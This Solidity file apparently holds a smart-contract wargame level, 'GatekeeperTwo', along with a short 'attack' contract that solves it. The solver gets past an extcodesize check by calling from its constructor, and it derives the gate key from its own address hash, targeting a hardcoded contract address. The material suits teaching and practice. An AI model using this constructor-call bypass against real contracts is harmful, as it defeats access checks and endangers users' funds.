// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) } // 생성자로 우회
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract attack
{

  GatekeeperTwo public target = GatekeeperTwo(0x5a914Ad26ec874eE6263f86c9907b40Ee848f146);
  constructor() public
  {
    uint64 a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 b = uint64(0)-1;
    bytes8 gatekey = bytes8(a ^ b);
    target.enter(gatekey);
  }
}